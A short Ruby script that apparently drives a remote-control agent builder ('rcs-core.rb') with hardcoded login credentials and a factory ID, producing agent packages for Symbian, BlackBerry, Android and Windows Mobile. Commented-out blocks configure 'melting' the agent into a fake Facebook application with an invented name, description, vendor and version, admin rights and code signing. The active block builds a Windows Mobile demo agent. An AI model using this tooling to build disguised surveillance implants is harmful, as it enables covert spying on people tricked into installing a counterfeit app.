#!/usr/bin/env ruby

require 'json'

USER = 'alor'
PASS = 'demorcss'
FACTORY = 'RCS_0000000001'
PLATFORM = 'card'

###################################################################################################
=begin
  params = {platform: PLATFORM,
            binary: {demo: true},
            melt: {appname: 'facebook'},
            sign: {edition: '5th3rd'},
            }

File.open('build.json', 'w') {|f| f.write params.to_json}
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip" or raise("Failed")
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -C symbian.cer -o #{PLATFORM}.zip" or raise("Failed")
#system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -i macos_app.zip -o osx_melted.zip" or raise("Failed")
=end
###################################################################################################
=begin
params = {platform: PLATFORM,
          generate: {platforms: ['blackberry', 'android'],
                     binary: {demo: true, admin: true},
                     melt: {admin: true,
                            appname: 'facebook',
                            name: 'Facebook Application',
                            desc: 'Applicazione utilissima di social network',
                            vendor: 'face inc',
                            version: '1.2.3'},
                     sign: {edition: '5th3rd'}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
=end
###################################################################################################
begin
params = {platform: PLATFORM,
          generate: {platforms: ['winmo'],
                     binary: {demo: true}
                    }
          }

File.open('build.json', 'w') {|f| f.write params.to_json}
system "ruby ./rcs-core.rb -u #{USER} -p #{PASS} -f #{FACTORY} -b build.json -o #{PLATFORM}.zip"
end
###################################################################################################